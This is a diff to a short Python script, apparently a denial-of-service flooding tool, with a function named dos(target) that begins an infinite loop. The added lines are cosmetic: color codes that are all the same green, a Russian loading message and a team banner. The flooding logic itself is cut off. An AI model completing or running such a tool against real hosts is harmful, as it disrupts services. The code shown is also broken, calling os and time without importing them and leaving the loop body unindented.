@@ -1,6 +1,22 @@
 import colorama
 import threading
 import requests
+# Colors
+yellow='\033[92m'
+cyan='\033[92m'
+pink='\033[92m'
+green = '\033[92m'
+red ='\033[92m'
+white ='\033[92m'
+black ='\033[92m'
+# Requests
+
+os.system("clear")
+print(green + f"З А Г Р У З К А....")
+time.sleep(1.5)
+os.system("clear")
+
+print( '''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''')
 
 def dos(target):
 while True:
